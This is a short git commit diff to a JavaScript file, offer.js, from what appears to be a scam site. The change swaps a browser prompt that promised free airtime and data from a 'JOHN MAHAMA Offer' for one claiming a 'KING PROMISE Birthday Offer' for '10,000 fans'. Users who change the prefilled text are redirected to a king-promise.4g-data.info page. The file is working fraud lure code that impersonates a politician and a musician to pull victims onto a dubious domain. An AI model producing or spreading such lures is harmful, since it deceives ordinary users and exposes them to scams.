616023e3ef57d7e311588267ddd447bfb04e7639
codexken <inyeneawakessien@gmail.com>
2024-08-16 05:17:38 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '10GB + GH₵20 Airtime'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','10GB + GH₵20 Airtime');
+password=prompt('SMS: Congratulations You are among the 10,000 fans to receive GH₵20 Airtime and 10GB Free Data From KING PROMISE Birthday Offer, Kindly Press OK to ACTIVATE ','10GB + GH₵20 Airtime');
 if (password != '10GB + GH₵20 Airtime') {
 location.href='https://king-promise.4g-data.info/10GB';
 }
